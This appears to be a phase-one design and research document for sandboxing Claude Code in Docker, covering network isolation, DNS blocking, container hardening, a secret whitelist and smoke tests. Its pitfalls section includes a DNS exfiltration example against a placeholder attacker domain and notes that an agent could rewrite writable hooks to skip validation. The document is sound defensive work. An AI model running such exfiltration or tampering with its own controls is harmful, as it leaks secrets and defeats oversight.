# Phase 1: Docker Infrastructure - Research

**Researched:** 2026-04-08
**Domain:** Docker network isolation, container hardening, whitelist configuration
**Confidence:** HIGH

## Summary

Phase 1 establishes the foundational Docker infrastructure for claude-secure: a dual-network topology where the claude container has no direct internet access, a proxy container bridges internal and external networks, and all security configuration files are root-owned and immutable by the Claude process. This phase does NOT implement the proxy logic, validator logic, or hook logic -- it builds the container topology, Dockerfiles, Docker Compose orchestration, and whitelist configuration schema that all subsequent phases depend on.

The critical technical challenge is DNS exfiltration prevention. Docker's `internal: true` network flag removes the default gateway (blocking direct TCP/UDP internet access), but Docker's embedded DNS server at 127.0.0.11 still forwards external queries to the host's DNS resolvers. This means a container on an internal network can still resolve `google.com` unless additional measures are taken. The solution is to set `dns: ["127.0.0.1"]` on the claude container so external DNS queries go to a non-functional resolver, while Docker's embedded DNS continues to resolve container names (proxy, validator) on the internal network.

**Primary recommendation:** Build the Docker Compose file with dual networks, three service stubs (claude, proxy, validator), DNS exfiltration blocking, capability dropping, and file permission hardening. Create the whitelist.json schema with secrets and readonly_domains sections. Verify all five success criteria before marking complete.

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| DOCK-01 | Claude container runs on internal Docker network with no direct internet | Use `internal: true` on the claude-internal network; verify with `curl` from inside container |
| DOCK-02 | Only proxy container has external network access | Proxy attaches to both claude-internal and claude-external networks; claude and validator attach only to claude-internal |
| DOCK-03 | Docker Compose orchestrates all containers with correct networks and dependencies | docker-compose.yml with 3 services, 2 networks, `depends_on` for service ordering |
| DOCK-04 | DNS queries from claude container are blocked or routed to controlled resolver | Set `dns: ["127.0.0.1"]` on claude service to break external DNS forwarding; Docker's embedded DNS still resolves container names |
| DOCK-05 | Hook scripts, settings.json, and whitelist.json are root-owned and read-only (chmod 444/555) | Copy files in Dockerfile with root ownership, mount volumes with `:ro` flag, set permissions in build |
| DOCK-06 | Claude container drops all capabilities and sets no-new-privileges | `cap_drop: [ALL]` and `security_opt: [no-new-privileges:true]` in docker-compose.yml |
| WHIT-01 | Whitelist is a JSON file mapping secret placeholders to env var names and allowed domains | Create `config/whitelist.json` with `secrets` array containing `placeholder`, `env_var`, `allowed_domains` fields |
| WHIT-02 | Whitelist supports readonly_domains list for GET-only domains | Add `readonly_domains` array at top level of whitelist.json |
| WHIT-03 | Whitelist file is root-owned and read-only, mounted into containers that need it | `chown root:root`, `chmod 444`, mount with `:ro` flag |
</phase_requirements>

## Project Constraints (from CLAUDE.md)

- **Platform**: Must work on Linux (native) and WSL2 -- no macOS Docker Desktop support needed
- **Dependencies**: Docker, Docker Compose, curl, jq, uuidgen must be available on host
- **Security**: Hook scripts, settings, and whitelist must be root-owned and immutable by the Claude process
- **Architecture**: Proxy uses buffered request/response (no streaming) for Phase 1
- **Auth**: OAuth token (via `claude setup-token`) is primary; API key supported as fallback
- **No NFQUEUE**: Validator uses HTTP registration + iptables only (no kernel module dependency)
- **GSD workflow enforcement**: Do not make direct repo edits outside a GSD workflow unless explicitly asked

## Standard Stack

### Core

| Library/Tool | Version | Purpose | Why Standard |
|-------------|---------|---------|--------------|
| Docker Engine | 24.x+ (host has 29.3.1) | Container runtime | Industry standard; `internal` network flag provides kernel-level isolation |
| Docker Compose | v2.24+ (host has v5.1.1) | Multi-container orchestration | Built into Docker CLI; declarative networking, service dependencies, health checks |
| Node.js | 20 LTS | Claude container base (claude-code) and proxy base | LTS; `node:20-slim` base image for claude container |
| Python | 3.11+ | Validator container base | stdlib `http.server` + `sqlite3`; `python:3.11-slim` base image |
| Bash | 5.x | Hook scripts | Available everywhere; Claude Code hooks are shell scripts |
| jq | 1.7+ | JSON processing in hooks | Standard JSON manipulation in shell |

### Supporting

| Tool | Purpose | When to Use |
|------|---------|-------------|
| `uuidgen` | Generate call-IDs in hook scripts | Every whitelisted tool call registration |
| `curl` | Hook-to-validator HTTP communication | Hook registers call-IDs with validator |
| ShellCheck | Bash script linting | During development of hook and installer scripts |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| `node:20-slim` for claude | `ubuntu:22.04` | Ubuntu is larger (~200MB vs ~60MB) but has more tools pre-installed; slim is better for minimal attack surface |
| `python:3.11-slim` for validator | `python:3.11-alpine` | Alpine is smaller but has musl libc which can cause subtle compatibility issues with iptables; slim (glibc) is safer |
| `dns: ["127.0.0.1"]` for DNS blocking | iptables rules blocking port 53 | DNS config is simpler and doesn't require NET_ADMIN on claude container; iptables is Phase 2 validator concern |

**Installation:**
```bash
# No package installation needed -- all tools are containerized
# Host only needs: docker, docker compose (already verified present)
```

## Architecture Patterns

### Recommended Project Structure

```
claude-secure/
├── docker-compose.yml              # 3 services, 2 networks, volumes
├── claude/                          # Claude Code container
│   ├── Dockerfile                   # FROM node:20-slim, installs claude-code
│   ├── settings.json                # Hook configuration (PreToolUse matcher)
│   └── hooks/
│       └── pre-tool-use.sh          # Stub for Phase 2 (exits 0 for now)
├── proxy/                           # Anthropic proxy container
│   ├── Dockerfile                   # FROM node:20-slim
│   └── proxy.js                     # Stub: simple HTTP pass-through for Phase 1
├── validator/                       # Call validator container
│   ├── Dockerfile                   # FROM python:3.11-slim + iptables
│   └── validator.py                 # Stub: HTTP server returning 200 for Phase 1
├── config/                          # Shared configuration (root-owned, read-only)
│   └── whitelist.json               # Secret-to-domain mapping + readonly domains
└── tests/
    └── test-phase1.sh               # Smoke tests for network isolation + permissions
```

### Pattern 1: Dual-Network Isolation

**What:** Docker Compose defines two networks: `claude-internal` (marked `internal: true`, no default gateway) and `claude-external` (standard bridge with internet access). The claude and validator containers attach only to `internal`. The proxy container bridges both.

**When to use:** Whenever a container must communicate with peers but must not reach the internet directly.

**Example:**
```yaml
# Source: Docker Compose networking docs
networks:
  claude-internal:
    internal: true       # No internet gateway -- kernel-enforced
  claude-external: {}    # Standard bridge, internet access

services:
  claude:
    networks: [claude-internal]                    # Isolated
  proxy:
    networks: [claude-internal, claude-external]   # Bridges both
  validator:
    networks: [claude-internal]                    # Isolated
```

### Pattern 2: DNS Exfiltration Prevention

**What:** Docker's embedded DNS (127.0.0.11) forwards external queries even on internal networks. Setting `dns: ["127.0.0.1"]` on the claude container overrides the fallback DNS servers so external queries go to a non-functional address. Docker's embedded DNS still resolves container names on the internal network.

**When to use:** Any container that must resolve peer container names but must NOT resolve external hostnames.

**Example:**
```yaml
services:
  claude:
    dns:
      - "127.0.0.1"    # External DNS queries fail (no real resolver)
    # Docker's embedded DNS at 127.0.0.11 still resolves "proxy", "validator"
```

### Pattern 3: Immutable Security Configuration

**What:** Security files (hooks, settings.json, whitelist.json) are root-owned with restrictive permissions, COPY'd into the image during build, and additionally mounted read-only at runtime.

**When to use:** When the process running inside the container must not be able to modify its own security controls.

**Example (Dockerfile):**
```dockerfile
# Hook scripts -- root-owned, execute-only
COPY hooks/ /etc/claude-secure/hooks/
RUN chmod 555 /etc/claude-secure/hooks/ && \
    chmod 555 /etc/claude-secure/hooks/*.sh

# Settings -- root-owned, read-only
COPY settings.json /root/.claude/settings.json
RUN chmod 444 /root/.claude/settings.json
```

**Example (docker-compose.yml):**
```yaml
volumes:
  - ./config/whitelist.json:/etc/claude-secure/whitelist.json:ro
  - ./claude/hooks:/etc/claude-secure/hooks:ro
```

### Pattern 4: Claude Code Hook Configuration (Verified Against Current Docs)

**What:** Claude Code hooks are configured in `settings.json` (at `~/.claude/settings.json` or `.claude/settings.json`). The PreToolUse hook receives JSON on stdin with `tool_name`, `tool_input`, `session_id`, `cwd`, and other fields. Exit code 0 allows, exit code 2 blocks (with stderr fed to Claude as error message).

**When to use:** For the hook script skeleton that will be expanded in Phase 2.

**Verified stdin format (from official docs at code.claude.com/docs/en/hooks):**
```json
{
  "session_id": "abc123",
  "transcript_path": "/path/to/transcript.jsonl",
  "cwd": "/current/working/directory",
  "hook_event_name": "PreToolUse",
  "tool_name": "Bash",
  "tool_use_id": "toolu_01ABC123...",
  "tool_input": {
    "command": "curl https://example.com",
    "description": "...",
    "timeout": 120000
  }
}
```

**Exit codes:**
| Code | Behavior |
|------|----------|
| 0 | Allow the tool call. stdout parsed as JSON if present. |
| 2 | Block the tool call. stderr fed to Claude as error message. |
| 1 | Non-blocking error. Execution continues. |

**JSON output format for blocking (stdout on exit 0):**
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "Domain not whitelisted"
  }
}
```

**Important:** Hooks can also output `permissionDecision: "allow"` to explicitly allow without prompting. For Phase 1, the stub hook should exit 0 (allow everything) since validation logic is Phase 2.

### Anti-Patterns to Avoid

- **Storing secrets in container environment variables:** Visible via `docker inspect`, `/proc/self/environ`. Secrets must live in mounted files only, not in `environment:` blocks.
- **Mutable hook scripts:** Never mount hooks as regular writable volumes. Always root-owned, `chmod 555`, mounted `:ro`.
- **Using `cap_add: [NET_ADMIN]` on claude container:** Only the validator needs NET_ADMIN for iptables. Claude container gets `cap_drop: ALL`.
- **Fail-open on errors:** If any security service is unreachable, block the request, don't allow it.
- **Using container IPs instead of service names:** IPs change on restart. Always use `http://proxy:8080`, `http://validator:8088`.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Network isolation | iptables rules on host | Docker `internal: true` network | Kernel-enforced, survives container restarts, no host config pollution |
| Container orchestration | Shell scripts starting containers | Docker Compose | Declarative, handles dependencies, networking, volumes, restarts |
| DNS blocking | Custom DNS proxy | `dns: ["127.0.0.1"]` in Compose | One line of config vs. an entire DNS service |
| File permissions | Runtime chmod scripts | Dockerfile COPY + RUN chmod | Baked into image layer, cannot be overridden at runtime |

## Common Pitfalls

### Pitfall 1: DNS Exfiltration via Docker Embedded DNS

**What goes wrong:** Docker's `internal: true` blocks TCP/UDP egress but Docker's embedded DNS (127.0.0.11) still forwards external queries. Secrets can leak via crafted DNS queries like `dig secret-value.evil.com`.
**Why it happens:** `internal: true` removes the default gateway but Docker's DNS forwarding is a separate mechanism at the iptables/namespace level.
**How to avoid:** Set `dns: ["127.0.0.1"]` on the claude container. This overrides the fallback DNS servers so external queries go nowhere. Container name resolution (proxy, validator) still works via Docker's embedded DNS.
**Warning signs:** `docker exec claude nslookup google.com` succeeds from inside the container.

### Pitfall 2: Hook Scripts Writable by Claude Process

**What goes wrong:** If hooks are mounted as regular volumes owned by the container's user, Claude Code can modify the hook to skip validation entirely.
**Why it happens:** Default Docker volume mounts preserve host permissions, and the container process may run as the same UID that owns the files.
**How to avoid:** COPY hooks into the image as root during build, set `chmod 555`, AND mount with `:ro` flag. Use `cap_drop: ALL` and `no-new-privileges: true` on the claude container.
**Warning signs:** `docker exec claude ls -la /etc/claude-secure/hooks/` shows non-root ownership or writable permissions.

### Pitfall 3: Docker Compose `version` Key Deprecation

**What goes wrong:** Using `version: "3.9"` in docker-compose.yml triggers deprecation warnings on modern Docker Compose v2.
**Why it happens:** Docker Compose v2 infers the schema version and the `version` key is ignored.
**How to avoid:** Omit the `version` key entirely from docker-compose.yml. The Project.md example includes it but modern Compose doesn't need it.
**Warning signs:** `WARNING: docker-compose.yml: the attribute 'version' is obsolete`.

### Pitfall 4: Node.js 20 LTS End-of-Life

**What goes wrong:** Node.js 20 LTS reached end-of-life in April 2026 (current month). Images may stop receiving security patches.
**Why it happens:** Node.js LTS versions have a 30-month support window.
**How to avoid:** Use `node:22-slim` as the base image instead. Node.js 22 LTS is active until April 2027. The claude-code npm package should work on Node 22.
**Warning signs:** Vulnerability scanners flagging the Node.js 20 base image.

### Pitfall 5: Volume Mount Exposing Host Secrets

**What goes wrong:** Mounting the entire project directory exposes `.env`, `.git/config`, and other secret-bearing files to Claude.
**Why it happens:** Convenience-driven broad volume mounts.
**How to avoid:** Mount only the specific workspace directory. Never mount `~/.ssh`, `~/.aws`, `~/.config`. The `config/.env` should only be mounted into proxy and validator, NOT into the claude container.
**Warning signs:** Claude can `cat /etc/claude-secure/.env` or `cat .env` and see real secret values.

## Code Examples

### Complete docker-compose.yml Skeleton

```yaml
# Source: Project.md specification adapted for Phase 1

services:
  claude:
    build: ./claude
    container_name: claude-secure
    stdin_open: true
    tty: true
    command: ["claude", "--dangerously-skip-permissions"]
    environment:
      - ANTHROPIC_BASE_URL=http://proxy:8080
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY:-dummy}
      - CLAUDE_CODE_OAUTH_TOKEN=${CLAUDE_CODE_OAUTH_TOKEN:-}
    dns:
      - "127.0.0.1"           # Block external DNS resolution
    volumes:
      - workspace:/workspace
      - ./config/whitelist.json:/etc/claude-secure/whitelist.json:ro
      - ./claude/hooks:/etc/claude-secure/hooks:ro
      - claude-auth:/root/.claude
    networks:
      - claude-internal
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    depends_on:
      proxy:
        condition: service_started
      validator:
        condition: service_started

  proxy:
    build: ./proxy
    container_name: claude-proxy
    environment:
      - REAL_ANTHROPIC_BASE_URL=https://api.anthropic.com
      - WHITELIST_PATH=/etc/claude-secure/whitelist.json
    volumes:
      - ./config/whitelist.json:/etc/claude-secure/whitelist.json:ro
      - ./config/.env:/etc/claude-secure/.env:ro
    networks:
      - claude-internal
      - claude-external

  validator:
    build: ./validator
    container_name: claude-validator
    volumes:
      - ./config/whitelist.json:/etc/claude-secure/whitelist.json:ro
      - validator-db:/data
    networks:
      - claude-internal
    cap_add:
      - NET_ADMIN

networks:
  claude-internal:
    internal: true
  claude-external: {}

volumes:
  workspace:
    driver: local
    driver_opts:
      type: none
      o: bind
      device: ${WORKSPACE_PATH:-./workspace}
  claude-auth:
  validator-db:
```

### Whitelist.json Schema

```json
{
  "secrets": [
    {
      "placeholder": "PLACEHOLDER_GITHUB",
      "env_var": "GITHUB_TOKEN",
      "allowed_domains": ["github.com", "api.github.com", "raw.githubusercontent.com"]
    }
  ],
  "readonly_domains": [
    "google.com",
    "stackoverflow.com",
    "docs.anthropic.com"
  ]
}
```

### Stub Hook Script (Phase 1)

```bash
#!/bin/bash
# pre-tool-use.sh -- Phase 1 stub (allows all calls)
# Full validation logic will be implemented in Phase 2
# This stub ensures the hook infrastructure works correctly

set -euo pipefail

# Read stdin (required even if we don't process it)
INPUT=$(cat)

# Phase 1: allow all tool calls
exit 0
```

### Stub Proxy (Phase 1)

```javascript
// proxy.js -- Phase 1 stub (simple pass-through)
// Full secret redaction will be implemented in Phase 3
const http = require('http');
const https = require('https');

const UPSTREAM = process.env.REAL_ANTHROPIC_BASE_URL || 'https://api.anthropic.com';

const server = http.createServer((req, res) => {
  let body = '';
  req.on('data', chunk => { body += chunk; });
  req.on('end', () => {
    const url = new URL(req.url, UPSTREAM);
    const upstreamReq = https.request(url, {
      method: req.method,
      headers: { ...req.headers, host: url.host, 'content-length': Buffer.byteLength(body) }
    }, upstreamRes => {
      let responseBody = '';
      upstreamRes.on('data', chunk => { responseBody += chunk; });
      upstreamRes.on('end', () => {
        res.writeHead(upstreamRes.statusCode, upstreamRes.headers);
        res.end(responseBody);
      });
    });
    upstreamReq.on('error', err => { res.writeHead(502); res.end('Bad Gateway'); });
    upstreamReq.write(body);
    upstreamReq.end();
  });
});

server.listen(8080, () => console.log('Proxy listening on :8080'));
```

### Stub Validator (Phase 1)

```python
#!/usr/bin/env python3
"""Phase 1 stub validator -- accepts all registrations, no iptables yet."""
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

class RegisterHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            length = int(self.headers.get('Content-Length', 0))
            self.rfile.read(length)  # consume body
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8088), RegisterHandler)
    print('Validator HTTP server listening on :8088')
    server.serve_forever()
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Docker Compose v1 (`docker-compose`) | Docker Compose v2 (`docker compose`) | 2023 | V1 deprecated; V2 built into Docker CLI |
| `version: "3.9"` in compose file | Omit version key entirely | Compose v2.x | Version key is ignored; triggers deprecation warning |
| Node.js 20 LTS | Node.js 22 LTS | April 2026 | Node 20 EOL this month; use Node 22 for active support |
| NFQUEUE packet inspection | HTTP registration + iptables | Project decision | NFQUEUE requires kernel modules unavailable on WSL2 |

**Deprecated/outdated:**
- `docker-compose` (standalone v1 binary): Deprecated, use `docker compose` (v2 subcommand)
- `version` key in docker-compose.yml: Ignored by Compose v2, triggers warning
- Node.js 20 LTS: End-of-life April 2026; migrate to Node.js 22 LTS

## Open Questions

1. **Node.js 22 compatibility with claude-code npm package**
   - What we know: Node.js 20 is EOL this month. Node.js 22 LTS is the current active LTS.
   - What's unclear: Whether `@anthropic-ai/claude-code` officially supports Node.js 22.
   - Recommendation: Use `node:22-slim` as base image. If claude-code has issues on Node 22, fall back to `node:20-slim` (still receives critical fixes for a few months).

2. **Claude Code settings.json location inside container**
   - What we know: Settings can be at `~/.claude/settings.json` (user-level) or `.claude/settings.json` (project-level).
   - What's unclear: When running as root inside Docker, whether `/root/.claude/settings.json` is the correct path.
   - Recommendation: COPY to `/root/.claude/settings.json` in the Dockerfile since the container runs as root. Verify by running `claude --version` inside the container and checking if hooks are loaded.

3. **Workspace volume mount on first run**
   - What we know: The `workspace` volume uses a bind mount to `${WORKSPACE_PATH:-./workspace}`.
   - What's unclear: Whether Docker will create the `./workspace` directory automatically if it doesn't exist.
   - Recommendation: Ensure the directory exists before `docker compose up`. The installer (Phase 4) will handle this.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| Docker Engine | All containers | Yes | 29.3.1 | -- |
| Docker Compose | Orchestration | Yes | v5.1.1 | -- |
| curl | Hook scripts | Yes | (system) | -- |
| jq | Hook scripts | Yes | (system) | -- |
| uuidgen | Hook scripts | Yes | (system) | -- |
| iptables | Validator (Phase 2) | Yes | v1.8.10 (nf_tables) | -- |

**Missing dependencies with no fallback:** None -- all required tools are available.

**Note:** iptables on this system uses the nf_tables backend, which is the modern standard. This is compatible with the `iptables` CLI commands we will use.

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | Bash + docker compose exec + curl |
| Config file | None needed -- shell scripts |
| Quick run command | `bash tests/test-phase1.sh` |
| Full suite command | `bash tests/test-phase1.sh` |

### Phase Requirements -> Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| DOCK-01 | Claude container has no direct internet | integration | `docker exec claude-secure curl -sf --max-time 5 https://api.anthropic.com && exit 1 \|\| exit 0` | Wave 0 |
| DOCK-02 | Proxy can reach external URLs | integration | `docker exec claude-proxy curl -sf --max-time 10 https://api.anthropic.com/v1 -o /dev/null` | Wave 0 |
| DOCK-03 | Docker Compose orchestrates correctly | smoke | `docker compose ps --format json \| jq -e 'length == 3'` | Wave 0 |
| DOCK-04 | DNS queries from claude blocked | integration | `docker exec claude-secure nslookup google.com 2>&1 \| grep -q "SERVFAIL\|connection timed out\|can't resolve" && exit 0 \|\| exit 1` | Wave 0 |
| DOCK-05 | Security files root-owned and read-only | integration | `docker exec claude-secure stat -c '%U %a' /etc/claude-secure/whitelist.json \| grep -q 'root 444'` | Wave 0 |
| DOCK-06 | Capabilities dropped | integration | `docker inspect claude-secure --format '{{.HostConfig.CapDrop}}' \| grep -q ALL` | Wave 0 |
| WHIT-01 | Whitelist maps placeholders to env vars and domains | unit | `jq -e '.secrets[0] \| has("placeholder","env_var","allowed_domains")' config/whitelist.json` | Wave 0 |
| WHIT-02 | Whitelist has readonly_domains | unit | `jq -e 'has("readonly_domains")' config/whitelist.json` | Wave 0 |
| WHIT-03 | Whitelist is root-owned, read-only, mounted ro | integration | `docker exec claude-secure test ! -w /etc/claude-secure/whitelist.json` | Wave 0 |

### Sampling Rate

- **Per task commit:** `bash tests/test-phase1.sh`
- **Per wave merge:** `bash tests/test-phase1.sh` (same -- single test file)
- **Phase gate:** All 9 tests green before `/gsd:verify-work`

### Wave 0 Gaps

- [ ] `tests/test-phase1.sh` -- covers DOCK-01 through DOCK-06, WHIT-01 through WHIT-03
- [ ] `config/whitelist.json` -- example whitelist with at least one secret entry and readonly_domains
- [ ] `./workspace/` directory -- must exist for bind mount

## Sources

### Primary (HIGH confidence)
- [Docker Compose networks documentation](https://docs.docker.com/compose/compose-file/06-networks/) -- `internal: true` creates externally isolated network
- [Claude Code hooks reference](https://code.claude.com/docs/en/hooks) -- PreToolUse stdin format, exit codes, matcher syntax, JSON output schema (verified 2026-04-08)
- Docker Engine on host -- verified Docker 29.3.1, Compose v5.1.1, iptables v1.8.10 (nf_tables)

### Secondary (MEDIUM confidence)
- [Docker DNS behavior](https://forums.docker.com/t/docker-dns-server-127-0-0-11-problem/40577) -- embedded DNS at 127.0.0.11 forwards external queries to host resolvers
- [Docker Compose dns option](https://oneuptime.com/blog/post/2026-02-08-how-to-use-docker-compose-dns-and-dnssearch-options/view) -- `dns` option overrides fallback DNS servers while Docker embedded DNS still handles container names
- Project specification (`Project.md`) -- docker-compose.yml template, file permissions model, whitelist schema

### Tertiary (LOW confidence)
- Node.js 22 compatibility with claude-code npm package -- not verified, recommendation based on LTS timeline

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH -- Docker, Compose, Node.js, Python are mature; versions verified on host
- Architecture: HIGH -- dual-network topology is well-documented Docker pattern; hook format verified against current official docs
- Pitfalls: HIGH -- DNS exfiltration and permission hardening are well-understood Docker security concerns; Node.js EOL is factual
- Whitelist schema: HIGH -- directly from project specification with clear JSON structure

**Research date:** 2026-04-08
**Valid until:** 2026-05-08 (30 days -- stable domain, low churn)
